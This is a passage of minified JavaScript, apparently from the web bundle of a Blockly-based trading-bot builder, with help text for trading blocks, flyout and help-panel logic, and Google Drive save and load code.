                        text: () => [(0, m.NC)("This block performs arithmetic operations between two numbers."), (0, m.NC)("Available operations:"), (0, m.NC)("- Addition"), (0, m.NC)("- Subtraction"), (0, m.NC)("- Multiplication"), (0, m.NC)("- Division"), (0, m.NC)("- Raise the first number to the power of the second number")]
                    },
                    ea = {
                        text: () => [(0, m.NC)("This block constrains a given number within a set range."), (0, m.NC)("In case if the given number is less than the lower boundary of the range, the block returns the lower boundary value. Similarly, if the given number is greater than the higher boundary, the block will return the higher boundary value. In case if the given value is between boundaries, the block will return the given value unchanged."), (0, m.NC)("In the below example the block returns the value of 10 as the given value (5) is less than the lower boundary (10)")]
                    },
                    ei = {
                        text: () => [(0, m.NC)("This block performs the following operations to a given number"), (0, m.NC)("Available operations are:"), (0, m.NC)("- Square root"), (0, m.NC)("- Absolute"), (0, m.NC)("- Negation"), (0, m.NC)("- Natural log"), (0, m.NC)("- Euler’s number (2.71) to the power of a given number"), (0, m.NC)("- 10 to the power of a given number")]
                    },
                    el = {
                        text: () => [(0, m.NC)("This block sends a message to a Telegram channel. You will need to create your own Telegram bot to use this block."), (0, m.NC)("Here’s how:"), (0, m.NC)("1. Create a Telegram bot and get your Telegram API token. Read more on how to create bots in Telegram here: https://core.telegram.org/bots#6-botfather"), (0, m.NC)("2. Start a chat with your newly created Telegram bot and make sure to send it some messages before proceeding to the next step. (e.g. Hello Bot!)"), (0, m.NC)("3. Get the chat ID using the Telegram REST API (read more: https://core.telegram.org/bots/api#getupdates)"), (0, m.NC)("- Visit the following URL, make sure to replace <access_token> with the Telegram API token you created in Step 1: https://api.telegram.org/bot<access_token>/getUpdates"), (0, m.NC)("- Find the chat ID property in the response, and copy the value of the id property"), (0, m.NC)("4. Come back to Binarytools and add the Notify Telegram block to the workspace. Paste the Telegram API token and chat ID into the block fields accordingly.")]
                    },
                    eo = {
                        text: () => [(0, m.NC)("This block gives you a list of candles within a selected time interval."), (0, m.NC)('In this example, this block is used with another block to get the open prices from a list of candles. The open prices are then assigned to the variable called "cl".')]
                    },
                    es = {
                        text: () => [(0, m.NC)("This block gives you the selected candle value from a list of candles within the selected time interval. You can choose from open price, close price, high price, low price, and open time."), (0, m.NC)('In this example, the open prices from a list of candles are assigned to a variable called "candle_list".')]
                    },
                    er = {
                        text: () => [(0, m.NC)("This block gives you the selected candle value from a list of candles. You can choose from open price, close price, high price, low price, and open time."), (0, m.NC)("This block requires a list of candles as an input parameter."), (0, m.NC)('In this example, the open prices from a list of candles are assigned to a variable called "cl".')]
                    },
                    ed = {
                        text: () => [(0, m.NC)("Used within a function block, this block returns a value when a specific condition is true."), (0, m.NC)("Example:")]
                    },
                    ec = {
                        text: () => [(0, m.NC)("This block gives you information about your last contract."), (0, m.NC)("You can choose to see one of the following:"), (0, m.NC)("- Deal reference ID: the reference ID of the contract"), (0, m.NC)("- Purchase price: the purchase price (stake) of the contract"), (0, m.NC)("- Payout: the payout of the contract"), (0, m.NC)("- Profit: the profit you’ve earned"), (0, m.NC)("- Contract type: the name of the contract type such as Rise, Fall, Touch, No Touch, etс."), (0, m.NC)("- Entry time: the starting time of the contract"), (0, m.NC)("- Entry value: the value of the first tick of the contract"), (0, m.NC)("- Exit time: the contract expiration time"), (0, m.NC)("- Exit value: the value of the last tick of the contract"), (0, m.NC)("- Barrier: the barrier value of the contract (applicable to barrier-based trade types such as stays in/out, touch/no touch, etc.)"), (0, m.NC)('- Result: the result of the last contract: "win" or "loss"')]
                    },
                    eu = {
                        text: () => [(0, m.NC)("This block gives you the specified candle value for a selected time interval. You can choose which value you want:"), (0, m.NC)("- Open: the opening price"), (0, m.NC)("- High: the highest price"), (0, m.NC)("- Low: the lowest price"), (0, m.NC)("- Close: the closing price"), (0, m.NC)("- Open time: the opening time stamp"), (0, m.NC)('In the example below, the opening price is selected, which is then assigned to a variable called "op".')]
                    },
                    em = {
                        text: () => [(0, m.NC)("This block gives you the selected candle value such as open price, close price, high price, low price, and open time. It requires a candle as an input parameter."), (0, m.NC)('In the example below, the open price is assigned to the variable "op".')]
                    },
                    eb = {
                        text: () => [(0, m.NC)("Use this block to sell your contract at the market price. Selling your contract is optional. You may choose to sell if the market trend is unfavourable."), (0, m.NC)("Example:")]
                    },
                    ep = {
                        text: () => [(0, m.NC)('This block gives you the potential profit or loss if you decide to sell your contract. It can only be used within the "Sell conditions" root block.'), (0, m.NC)("In the example below, the contract will only be sold if the potential profit or loss is more than the stake.")]
                    },
                    ef = {
                        text: () => [(0, m.NC)("SMA adds the market price in a list of ticks or candles for a number of time periods, and divides the sum by that number of time periods."), (0, m.NC)("The formula for SMA is:"), (0, m.NC)("where n is the number of periods."), "", (0, m.NC)("What SMA tells you"), (0, m.NC)("SMA serves as an indicator of the trend. If the SMA points up then the market price is increasing and vice versa. The larger the period number, the smoother SMA line is."), (0, m.NC)("In this example, each point of the SMA line is an arithmetic average of close prices for the last 10 days."), (0, m.NC)("In this example, each point of the SMA line is an arithmetic average of close prices for the last 50 days."), "", (0, m.NC)("How to use the SMA block"), (0, m.NC)("Input list accepts a list of ticks or candles, while period is the specified time period."), (0, m.NC)("Example:"), (0, m.NC)("This will display the SMA for the specified period, using a candle list."), (0, m.NC)("SMA places equal weight to the entire distribution of values."), (0, m.NC)("This is the same as the above example, using a tick list."), (0, m.NC)("You may compare SMA values calculated on every bot run to identify the market trend direction. Alternatively, you may also use a variation of the SMA block, the Simple Moving Average Array block. "), (0, m.NC)("This block returns the entire SMA line, containing a list of all values for a given period."), (0, m.NC)("If a period of 10 is entered, the Simple Moving Average Array block will return a list of SMA values calculated based on period of 10."), (0, m.NC)("The below image illustrates how Simple Moving Average Array block works:")]
                    },
                    e_ = {
                        text: () => [(0, m.NC)('This block displays a dialog box with a customised message. When the dialog box is displayed, your strategy is paused and will only resume after you click "OK".')]
                    },
                    eh = {
                        text: () => [(0, m.NC)('This block displays a dialog box that uses a customised message to prompt for an input. The input can be either a string of text or a number and can be assigned to a variable. When the dialog box is displayed, your strategy is paused and will only resume after you enter a response and click "OK".')]
                    },
                    ev = {
                        text: () => [(0, m.NC)("Any blocks placed within this block will be executed at every tick. If the default candle interval is set to 1 minute in the Trade Parameters root block, the instructions in this block will be executed once every minute. Place this block outside of any root block.")]
                    },
                    ey = {
                        text: () => [(0, m.NC)("This block converts the number of seconds since the Unix Epoch to a date and time format such as 2019-08-01 00:00:00."), (0, m.NC)("Example:"), (0, m.NC)("In this example, the date and time will be displayed in a green notification box.")]
                    },
                    ek = {
                        text: () => [(0, m.NC)("This block converts the date and time to the number of seconds since the Unix Epoch (1970-01-01 00:00:00)."), (0, m.NC)("Example:"), (0, m.NC)("In this example, a Rise contract will be purchased at midnight on 1 August 2019.")]
                    },
                    eg = {
                        text: () => [(0, m.NC)("This block will transfer the control back to the Purchase conditions block, enabling you to purchase another contract without manually stopping and restarting your bot."), (0, m.NC)("Example:")]
                    },
                    eT = {
                        text: () => [(0, m.NC)("This block is mandatory. It's added to your strategy by default when you create new strategy. You can not add more than one copy of this block to the canvas."), (0, m.NC)("1. Market"), (0, m.NC)("Select your desired market and asset type. For example, Forex > Major pairs > AUD/JPY"), (0, m.NC)("2. Trade Type"), (0, m.NC)("Select your desired trade type. For example, Up/Down > Rise/Fall"), (0, m.NC)("3. Contract Type"), (0, m.NC)("Choose what type of contract you want to trade. For example, for the Rise/Fall trade type you can choose one of three options: Rise, Fall, or Both. Selected option will determine available options for the Purchase block."), (0, m.NC)("4. Default Candle Interval"), (0, m.NC)("Sets the default time interval for blocks that read list of candles."), (0, m.NC)("5. Restart buy/sell on error"), (0, m.NC)("Restarts the bot when an error is encountered."), (0, m.NC)("6. Restart last trade on error"), (0, m.NC)("Repeats the previous trade when an error is encountered."), (0, m.NC)("7. Run Once at Start"), (0, m.NC)("Place blocks here to perform tasks once when your bot starts running."), (0, m.NC)("8. Trade Options"), (0, m.NC)("The desired duration, stake, prediction, and/or barrier(s) for the contract is defined here.")]
                    };
                var eE = n("31865");
                let eA = {
                        text: () => [(0, m.NC)("Use this block when you want to use multipliers as your trade type."), (0, m.NC)("Click the multiplier drop-down menu and choose the multiplier value you want to trade with."), (0, m.NC)("Your potential profit will be multiplied by the multiplier value you’ve chosen."), (0, i.jsx)(m.Xx, {
                            i18n_default_text: "To learn more about multipliers, please go to the <0>Multipliers</0> page.",
                            components: [(0, i.jsx)(eE.Z, {
                                className: "link",
                                href: "trade-types/multiplier"
                            }, 0)]
                        }, 0)]
                    },
                    ex = {
                        text: () => [(0, m.NC)("This block is used to define trade options within the Trade parameters root block. Some options are only applicable for certain trade types. Parameters such as duration and stake are common among most trade types. Prediction is used for trade types such as Digits, while barrier offsets are for trade types that involve barriers such as Touch/No Touch, Ends In/Out, etc."), (0, m.NC)("Example:")]
                    },
                    ew = {
                        text: () => [(0, m.NC)("This block assigns a given value to a variable, creating the variable if it doesn't already exist."), (0, m.NC)("A variable is among the most important and powerful components in creating a bot. It is a way to store information, either as text or numbers. The information stored as a variable can be used and changed according to the given instructions. Variables can be given any name, but usually they are given useful, symbolic names so that it is easier to call them during the execution of instructions."), (0, m.NC)("Creating a variable"), (0, m.NC)("1. From the block library, enter a name for the new variable and click Create."), (0, m.NC)("2. The new variable will appear as a block under Set variable.")]
                    };
                class eN {
                    setActiveHelper(e) {
                        this.active_helper = e
                    }
                    onBackClick() {
                        let {
                            toolbox: e,
                            flyout: t
                        } = this.root_store;
                        if (t.is_search_flyout) {
                            let t = document.getElementsByName("search")[0].value;
                            e.onSearch({
                                search: t
                            })
                        } else t.refreshCategory()
                    }
                    async onSequenceClick(e) {
                        let t;
                        let a = Array.from(this.xml_list).find(e => e.getAttribute("type") === this.block_type);
                        Object.keys(this.xml_list_group).forEach((e, n) => {
                            a.getAttribute("type") === e && (t = n)
                        });
                        let i = async (e, t, a) => {
                                let l = t + (a ? 1 : -1),
                                    o = Object.keys(e).filter((e, t) => a ? l <= t : l >= t),
                                    s = await this.getFilledBlocksIndex(o),
                                    r = o[a ? s[0] : s[s.length - 1]];
                                if (!r) return !1;
                                try {
                                    return await Promise.resolve().then(n.bind(n, 88199)), r
                                } catch (t) {
                                    return i(e, l, a)
                                }
                            },
                            l = await i(this.xml_list_group, t, e);
                        if (l) {
                            let e = this.xml_list_group[l];
                            this.setHelpContent(e[0])
                        }
                    }
                    initFlyoutHelp(e) {
                        let {
                            flyout: t,
                            toolbox: n
                        } = this.root_store;
                        this.xml_list = n.getCategoryContents(t.selected_category), this.xml_list_group = this.groupBy(this.xml_list, !0), this.setHelpContent(e)
                    }
                    async updateSequenceButtons() {
                        let e = Array.from(this.xml_list).find(e => e.getAttribute("type") === this.block_type),
                            t = Object.keys(this.xml_list_group).findIndex(t => e.getAttribute("type") === t),
                            n = await this.getNextHelpContentIndex(!0),
                            a = await this.getNextHelpContentIndex(!1);
                        (0, s.z)(() => {
                            this.should_previous_disable = 0 === t || t === a, this.should_next_disable = t === Object.keys(this.xml_list_group).length - 1 || t === n
                        })
                    }
                    groupBy(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                        return Array.from(e).reduce((e, n) => {
                            let a = n.getAttribute("type");
                            return t && null === a ? e : (!e[a] && (e[a] = []), (!t || t && null !== a) && e[a].push(n), e)
                        }, {})
                    }
                    setExamples(e) {
                        let {
                            toolbox: t
                        } = this.root_store, n = [...t.toolbox_examples.childNodes], a = (0, M.S)(window.__webpack_public_path__)[e].filter(e => "example" === e.type).map(e => e.example_id).map(e => n.find(t => t.id === e));
                        this.examples = a
                    }
                    constructor(e) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "block_node", null), (0, o._)(this, "block_type", ""), (0, o._)(this, "examples", []), (0, o._)(this, "help_string", {}), (0, o._)(this, "title", ""), (0, o._)(this, "should_next_disable", !1), (0, o._)(this, "should_previous_disable", !1), (0, o._)(this, "active_helper", ""), (0, o._)(this, "setHelpContent", async e => {
                            let t = e.getAttribute("type"),
                                n = window.Blockly.Blocks[t].meta().display_name;
                            "" !== t && (this.active_helper = t);
                            let {
                                flyout: i
                            } = this.root_store;
                            this.setExamples(t);
                            let l = this.examples.map(e => e.childNodes[0]);
                            setTimeout(() => i.setFlyoutWidth([e, ...l]), 50), (0, s.z)(() => {
                                if (i.is_help_content = !0, this.block_node = e, this.block_type = t, this.title = n, "" !== t)
                                    for (let [e, n] of Object.entries(a[t])) this.help_string[e] = n()
                            }), !i.is_search_flyout && this.updateSequenceButtons()
                        }), (0, o._)(this, "getHelpContent", async e => {
                            let t;
                            return e && (t = a[this.xml_list_group[e][0].getAttribute("type")]), t
                        }), (0, o._)(this, "getFilledBlocksIndex", async e => (await Promise.all(e.map(e => this.getHelpContent(e)))).map((e, t) => e ? t : null).filter(e => null !== e)), (0, o._)(this, "getNextHelpContentIndex", async e => {
                            let t = await this.getFilledBlocksIndex(Object.keys(this.xml_list_group));
                            return e ? t[t.length - 1] : t[0]
                        }), (0, s.rC)(this, {
                            block_node: s.LO,
                            block_type: s.LO,
                            examples: s.LO,
                            help_string: s.LO,
                            title: s.LO,
                            should_next_disable: s.LO,
                            should_previous_disable: s.LO,
                            active_helper: s.LO,
                            setHelpContent: s.aD.bound,
                            setActiveHelper: s.aD.bound,
                            onBackClick: s.aD.bound,
                            onSequenceClick: s.aD.bound,
                            initFlyoutHelp: s.aD.bound,
                            updateSequenceButtons: s.aD.bound,
                            setExamples: s.aD.bound,
                            getHelpContent: s.aD.bound,
                            getFilledBlocksIndex: s.aD.bound,
                            getNextHelpContentIndex: s.aD.bound
                        }), this.root_store = e
                    }
                }
                var eS = n("18908");
                class eC {
                    onMount() {
                        this.initFlyout(), window.addEventListener("click", this.onClickOutsideFlyout)
                    }
                    onUnmount() {
                        window.removeEventListener("click", this.onClickOutsideFlyout)
                    }
                    initFlyout() {
                        var e, t, n;
                        let a = window.Blockly.derivWorkspace,
                            i = new window.Blockly.Options({
                                parentWorkspace: a,
                                rtl: a.RTL,
                                horizontalLayout: !0,
                                theme: null === (n = window) || void 0 === n ? void 0 : null === (t = n.Blockly) || void 0 === t ? void 0 : null === (e = t.Themes) || void 0 === e ? void 0 : e.zelos_renderer
                            });
                        a.horizontalLayout ? this.flyout = new window.Blockly.HorizontalFlyout(i) : this.flyout = new window.Blockly.VerticalFlyout(i), this.flyout.targetWorkspace = a, this.flyout.workspace_.targetWorkspace = a, this.flyout.workspace_.getGesture = this.flyout.targetWorkspace.getGesture.bind(this.flyout.targetWorkspace_), a.VariableMap = this.flyout.targetWorkspace.getVariableMap(), this.flyout.workspace_.createPotentialVariableMap()
                    }
                    initBlockWorkspace(e, t) {
                        var n, a, i, l, o, s, r, d, c;
                        let u = window.Blockly.inject(e, this.options);
                        u.targetWorkspace = window.Blockly.derivWorkspace;
                        let m = window.Blockly.Xml.domToBlock(t, u),
                            b = m.getHeightWidth();
                        m.isInFlyout = !0, e.style.height = `${Math.ceil(b.height*this.options.zoom.startScale)+1}px`, e.style.width = `${Math.ceil(b.width*this.options.zoom.startScale)+1}px`, m.moveBy(1, 1);
                        let p = m.getSvgRoot();
                        this.block_listeners.push(null === (i = window) || void 0 === i ? void 0 : null === (a = i.Blockly) || void 0 === a ? void 0 : null === (n = a.browserEvents) || void 0 === n ? void 0 : n.conditionalBind(p, "mousedown", null, e => {
                            var t;
                            null === eS.default || void 0 === eS.default || null === (t = eS.default.pushDataLayer) || void 0 === t || t.call(eS.default, {
                                event: "dbot_drag_block",
                                block_type: m.type
                            }), this.flyout.blockMouseDown(m)(e)
                        }), null === (s = window) || void 0 === s ? void 0 : null === (o = s.Blockly) || void 0 === o ? void 0 : null === (l = o.browserEvents) || void 0 === l ? void 0 : l.bind(p, "mouseout", m, m.removeSelect), null === (c = window) || void 0 === c ? void 0 : null === (d = c.Blockly) || void 0 === d ? void 0 : null === (r = d.browserEvents) || void 0 === r ? void 0 : r.bind(p, "mouseover", m, m.addSelect)), this.block_workspaces.push(u), window.Blockly.svgResize(u)
                    }
                    getFlyout() {
                        return this.flyout
                    }
                    setContents(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "";
                        this.block_listeners.forEach(e => window.Blockly.browserEvents.unbind(e)), this.block_workspaces.forEach(e => e.dispose()), this.block_listeners = [], this.block_workspaces = [], this.is_help_content = !1, this.search_term = t.length > 20 ? `${t.substring(0,20)}...` : t, this.flyout_content = e, this.setFlyoutWidth(e), this.setVisibility(!0), setTimeout(() => this.setFlyoutWidth(e), 50)
                    }
                    setFlyoutWidth(e) {
                        let t = 0;
                        e.forEach(e => {
                            if (e.tagName.toUpperCase() === window.Blockly.Xml.NODE_BLOCK) {
                                let n = window.Blockly.Block.getDimensions(e);
                                e.setAttribute("width", String(Math.ceil(n.width * this.options.zoom.startScale))), e.setAttribute("height", String(Math.ceil(n.height * this.options.zoom.startScale))), t = Math.max(t, Math.ceil(n.width * this.options.zoom.startScale))
                            }
                        }), this.flyout_width = Math.max(this.flyout_min_width, t + 65)
                    }
                    setVisibility(e) {
                        this.is_visible = e, !e && (this.setSelectedCategory(null), this.flyout_content = []), window.Blockly.derivWorkspace.isFlyoutVisible = e
                    }
                    setIsSearchFlyout(e) {
                        this.is_search_flyout = e
                    }
                    setSelectedCategory(e) {
                        this.selected_category = e
                    }
                    getSelectedCategory() {
                        return this.selected_category
                    }
                    onClickOutsideFlyout(e) {
                        if (!this.is_visible || !window.Blockly.derivWorkspace) return;
                        let t = document.getElementById("gtm-toolbox"),
                            n = ((null == e ? void 0 : e.composedPath()) || []).some(e => e.classList && e.classList.contains("flyout")),
                            a = this.root_store.toolbox.is_search_focus;
                        !n && !(null == t ? void 0 : t.contains(e.target)) && !a && (this.setVisibility(!1), this.setSelectedCategory(null))
                    }
                    refreshCategory() {
                        let e = this.getSelectedCategory(),
                            {
                                toolbox: t
                            } = this.root_store,
                            n = t.getCategoryContents(e);
                        this.setContents(n)
                    }
                    get variables_blocks_count() {
                        return this.flyout_content.filter(e => "variables_get" === e.getAttribute("type")).length
                    }
                    get first_get_variable_block_index() {
                        return this.flyout_content.length - this.variables_blocks_count
                    }
                    constructor(e) {
                        var t, n, a;
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "flyout", null), (0, o._)(this, "block_listeners", []), (0, o._)(this, "block_workspaces", []), (0, o._)(this, "flyout_min_width", 440), (0, o._)(this, "options", {
                            renderer: "zelos",
                            media: "assets/media/",
                            move: {
                                scrollbars: !1,
                                drag: !0,
                                wheel: !1
                            },
                            zoom: {
                                startScale: (0, c.config)().workspaces.flyoutWorkspacesStartScale
                            },
                            sounds: !1,
                            theme: null === (a = window) || void 0 === a ? void 0 : null === (n = a.Blockly) || void 0 === n ? void 0 : null === (t = n.Themes) || void 0 === t ? void 0 : t.zelos_renderer
                        }), (0, o._)(this, "is_help_content", !1), (0, o._)(this, "flyout_content", []), (0, o._)(this, "flyout_width", this.flyout_min_width), (0, o._)(this, "is_visible", !1), (0, o._)(this, "is_search_flyout", !1), (0, o._)(this, "is_loading", !1), (0, o._)(this, "search_term", ""), (0, o._)(this, "selected_category", null), (0, s.rC)(this, {
                            is_help_content: s.LO,
                            flyout_content: s.LO,
                            flyout_width: s.LO,
                            is_visible: s.LO,
                            is_search_flyout: s.LO,
                            is_loading: s.LO,
                            search_term: s.LO,
                            selected_category: s.LO,
                            onMount: s.aD.bound,
                            onUnmount: s.aD.bound,
                            initFlyout: s.aD.bound,
                            initBlockWorkspace: s.aD.bound,
                            getFlyout: s.aD.bound,
                            setContents: s.aD.bound,
                            setFlyoutWidth: s.aD.bound,
                            setVisibility: s.aD.bound,
                            setIsSearchFlyout: s.aD.bound,
                            setSelectedCategory: s.aD.bound,
                            getSelectedCategory: s.aD.bound,
                            onClickOutsideFlyout: s.aD.bound,
                            refreshCategory: s.aD.bound,
                            variables_blocks_count: s.Fl,
                            first_get_variable_block_index: s.Fl
                        }), this.root_store = e
                    }
                }
                let eO = Object.freeze({
                    NORMAL: 0,
                    LOADING: 1,
                    COMPLETED: 2
                });
                var eL = n("89057"),
                    eR = n("66062");
                class eI {
                    setIsAuthorized(e) {
                        this.is_authorised = e
                    }
                    async signIn() {
                        !this.is_authorised && await this.client.requestAccessToken()
                    }
                    async signOut() {
                        if (this.access_token) {
                            var e, t, n, a, i, l, o, s;
                            await (null === (n = window) || void 0 === n ? void 0 : null === (t = n.gapi) || void 0 === t ? void 0 : null === (e = t.client) || void 0 === e ? void 0 : e.setToken({
                                access_token: ""
                            })), localStorage.getItem("google_access_token") && (await (null === (o = window) || void 0 === o ? void 0 : null === (l = o.google) || void 0 === l ? void 0 : null === (i = l.accounts) || void 0 === i ? void 0 : null === (a = i.oauth2) || void 0 === a ? void 0 : a.revoke(this.access_token)), null === (s = localStorage) || void 0 === s || s.removeItem("google_access_token")), this.access_token = ""
                        }
                        this.setIsAuthorized(!1)
                    }
                    getPickerLanguage() {
                        let e = (0, m.Jb)();
                        return "zhTw" === e ? "zh-TW" : "zhCn" === e ? "zh-CN" : e
                    }
                    async saveFile(e) {
                        try {
                            await this.signIn(), this.access_token && gapi.client.setToken({
                                access_token: this.access_token
                            }), await this.checkFolderExists(), await this.createSaveFilePicker("application/vnd.google-apps.folder", (0, m.NC)("Select a folder"), e)
                        } catch (e) {
                            401 === e.status && this.signOut()
                        }
                    }
                    async loadFile() {
                        if (!!this.is_google_drive_token_valid) {
                            await this.signIn(), this.access_token && gapi.client.setToken({
                                access_token: this.access_token
                            });
                            try {
                                await gapi.client.drive.files.list({
                                    pageSize: 10,
                                    fields: "files(id, name)"
                                })
                            } catch (i) {
                                var e, t, n, a;
                                if ((null == i ? void 0 : i.status) === 401) {
                                    await this.signOut();
                                    let e = document.getElementsByClassName("picker-dialog-content")[0],
                                        t = null == e ? void 0 : e.parentNode;
                                    e && t && (null == t ? void 0 : t.contains(e)) && (null == t || t.removeChild(e)), null == e || null === (a = e.parentNode) || void 0 === a || a.removeChild(e);
                                    let n = document.getElementsByClassName("picker-dialog-bg");
                                    if (n.length)
                                        for (let e = 0; e < n.length; e++) n[e].style.display = "none"
                                }(0, eL.mu)({
                                    upload_provider: "google_drive",
                                    upload_id: this.upload_id,
                                    upload_type: "not_found",
                                    error_message: null == i ? void 0 : null === (t = i.result) || void 0 === t ? void 0 : null === (e = t.error) || void 0 === e ? void 0 : e.message,
                                    error_code: null == i ? void 0 : null === (n = i.status) || void 0 === n ? void 0 : n.toString()
                                })
                            }
                            return await this.createLoadFilePicker("text/xml,application/xml", (0, m.NC)("Select a Binarytools Strategy"))
                        }
                    }
                    async checkFolderExists() {
                        var e;
                        let {
                            files: t
                        } = gapi.client.drive, n = await t.list({
                            q: "trashed=false"
                        }), a = "application/vnd.google-apps.folder";
                        if (null === (e = n.result.files) || void 0 === e ? !void 0 : !e.find(e => e.mimeType === a)) await t.create({
                            resource: {
                                name: this.bot_folder_name,
                                mimeType: a
                            },
                            fields: "id"
                        })
                    }
                    createSaveFilePicker(e, t, n) {
                        let {
                            setButtonStatus: a
                        } = this.root_store.save_modal;
                        return new Promise(i => {
                            this.showGoogleDriveFilePicker(!0, e, t, e => {
                                if (e.action === google.picker.Action.PICKED) {
                                    let t = e.docs[0].id,
                                        l = new Blob([n.content], {
                                            type: n.mimeType
                                        }),
                                        o = JSON.stringify({
                                            name: n.name,
                                            mimeType: n.mimeType,
                                            parents: [t]
                                        }),
                                        s = new FormData;
                                    s.append("metadata", new Blob([o], {
                                        type: "application/json"
                                    })), s.append("file", l);
                                    let r = new XMLHttpRequest;
                                    r.responseType = "json", r.open("POST", "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart"), r.setRequestHeader("Authorization", `Bearer ${this.access_token}`), r.onload = () => {
                                        401 === r.status && this.signOut(), a(eO.NORMAL), i()
                                    }, r.send(s)
                                } else e.action === google.picker.Action.CANCEL && a(eO.NORMAL)
                            })
                        })
                    }
                    createLoadFilePicker(e, t) {
                        return new Promise(n => {
                            let a = async e => {
                                if (e.action === google.picker.Action.PICKED) {
                                    let t = e.docs[0];
                                    (null == t ? void 0 : t.driveError) === "NETWORK" && (0, eL.mu)({
                                        upload_provider: "google_drive",
                                        upload_id: this.upload_id,
                                        upload_type: "not_found",
                                        error_message: "File not found",
                                        error_code: "404"
                                    });
                                    let a = t.name,
                                        i = t.id,
                                        {
                                            files: l
                                        } = gapi.client.drive,
                                        {
                                            setOpenSettings: o
                                        } = this.root_store.dashboard,
                                        s = await l.get({
                                            alt: "media",
                                            fileId: i
                                        });
                                    n({
                                        xml_doc: s.body,
                                        file_name: a
                                    }), o(O.tx.BOT_IMPORT);
                                    let r = (0, eR.dC)(s.body);
                                    (0, eL.WN)({
                                        upload_provider: "google_drive",
                                        upload_type: r,
                                        upload_id: this.upload_id
                                    })
                                }
                            };
                            this.showGoogleDriveFilePicker(!1, e, t, a)
                        })
                    }
                    showGoogleDriveFilePicker(e, t, n, a) {
                        let i = new google.picker.DocsView;
                        i.setIncludeFolders(!0), i.setMimeTypes(t), e && i.setSelectFolderEnabled(!0), new google.picker.PickerBuilder().setOrigin(`${window.location.protocol}//${window.location.host}`).setTitle((0, m.NC)(n)).setLocale(this.getPickerLanguage()).setAppId(this.app_id).setOAuthToken(this.access_token).addView(i).setDeveloperKey(this.api_key).setSize(1051, 650).setCallback(a).build().setVisible(!0)
                    }
                    constructor(e) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "bot_folder_name", void 0), (0, o._)(this, "client_id", void 0), (0, o._)(this, "app_id", void 0), (0, o._)(this, "api_key", void 0), (0, o._)(this, "scope", void 0), (0, o._)(this, "discovery_docs", ""), (0, o._)(this, "client", void 0), (0, o._)(this, "access_token", void 0), (0, o._)(this, "upload_id", void 0), (0, o._)(this, "is_google_drive_token_valid", !0), (0, o._)(this, "is_authorised", !!localStorage.getItem("google_access_token")), (0, o._)(this, "setGoogleDriveTokenValid", e => {
                            this.is_google_drive_token_valid = e
                        }), (0, o._)(this, "setKey", () => {
                            let {
                                SCOPE: e,
                                DISCOVERY_DOCS: t
                            } = (0, c.config)().GOOGLE_DRIVE;
                            this.client_id = void 0, this.app_id = void 0, this.api_key = void 0, this.scope = e, this.discovery_docs = t
                        }), (0, o._)(this, "initialise", () => {
                            gapi.load("client:picker", () => gapi.client.load(this.discovery_docs))
                        }), (0, o._)(this, "setGoogleDriveTokenExpiry", e => {
                            let t = Math.floor(Date.now() / 1e3);
                            localStorage.setItem("google_access_token_expiry", (t + e).toString())
                        }), (0, o._)(this, "initialiseClient", () => {
                            this.client = google.accounts.oauth2.initTokenClient({
                                client_id: this.client_id,
                                scope: this.scope,
                                callback: e => {
                                    (null == e ? void 0 : e.access_token) && !(null == e ? void 0 : e.error) && (this.access_token = e.access_token, this.setIsAuthorized(!0), localStorage.setItem("google_access_token", e.access_token), this.setGoogleDriveTokenExpiry(null == e ? void 0 : e.expires_in), this.setGoogleDriveTokenValid(!0))
                                }
                            })
                        }), (0, o._)(this, "verifyGoogleDriveAccessToken", async () => {
                            var e;
                            let t = null === (e = localStorage) || void 0 === e ? void 0 : e.getItem("google_access_token_expiry");
                            return t ? Math.floor(Date.now() / 1e3) > Number(t) ? (this.signOut(), this.setGoogleDriveTokenValid(!1), localStorage.removeItem("google_access_token_expiry"), localStorage.removeItem("google_access_token"), (0, C.J)((0, O.xG)().google_drive_error, void 0, {
                                closeButton: !1
                            }), "not_verified") : "verified" : "not_verified"
                        }), (0, o._)(this, "onDriveConnect", async () => {
                            this.is_authorised ? this.signOut() : this.signIn()
                        }), (0, s.rC)(this, {
                            is_authorised: s.LO,
                            upload_id: s.LO,
                            is_google_drive_token_valid: s.LO,
                            setIsAuthorized: s.aD.bound,
                            saveFile: s.aD.bound,
                            loadFile: s.aD.bound,
                            setKey: s.aD.bound,
                            initialise: s.aD.bound,
                            signIn: s.aD.bound,
                            signOut: s.aD.bound,
                            getPickerLanguage: s.aD.bound,
                            checkFolderExists: s.aD.bound,
                            createSaveFilePicker: s.aD.bound,
                            createLoadFilePicker: s.aD.bound,
                            showGoogleDriveFilePicker: s.aD.bound,
                            setGoogleDriveTokenValid: s.aD.bound,
                            verifyGoogleDriveAccessToken: s.aD.bound,
                            onDriveConnect: s.aD
                        }), this.root_store = e, this.bot_folder_name = `Binary Bot - ${(0,m.NC)("Strategies")}`, this.setKey(), this.client = null, this.access_token = localStorage.getItem("google_access_token") ? ? "", setTimeout(() => {
                            (0, c.importExternal)("https://accounts.google.com/gsi/client").then(() => this.initialiseClient()), (0, c.importExternal)("https://apis.google.com/js/api.js").then(() => this.initialise())
                        }, 3e3)
                    }
                }
                var eD = n("57357"),
                    eU = n("47962"),
                    eP = n("89606"),
                    eV = n("8015"),
                    eM = n("63387"),
                    eB = n.n(eM),
                    eF = n("33716");
                let ej = e => {
                        let {
                            array: t,
                            open_ids: n,
                            setOpenIds: a
                        } = e, o = e => {
                            n.includes(e) ? a(n.filter(t => t !== e)) : a([...n, e])
                        };
                        return (0, i.jsx)(l.Fragment, {
                            children: t.map((e, t) => {
                                var l;
                                return Array.isArray(null == e ? void 0 : e.value) ? (0, i.jsxs)("div", {
                                    className: "dc-expansion-panel__content-array",
                                    children: [(0, i.jsxs)("div", {
                                        className: eB()("dc-expansion-panel__content-array", {
                                            "dc-expansion-panel__content-active": n.includes(e.id)
                                        }),
                                        children: [(0, i.jsx)("span", {
                                            className: "dc-expansion-panel__content-array-item-index",
                                            children: `${t+1}: `
                                        }), "(", `${e.value.length}`, ")", (0, i.jsx)(eP.J, {
                                            className: "dc-expansion-panel__content-chevron-icon",
                                            icon: "IcChevronRight",
                                            onClick: () => o(e.id)
                                        })]
                                    }), n.includes(e.id) ? (0, i.jsx)(ej, {
                                        array: e.value,
                                        open_ids: n,
                                        setOpenIds: a
                                    }) : null]
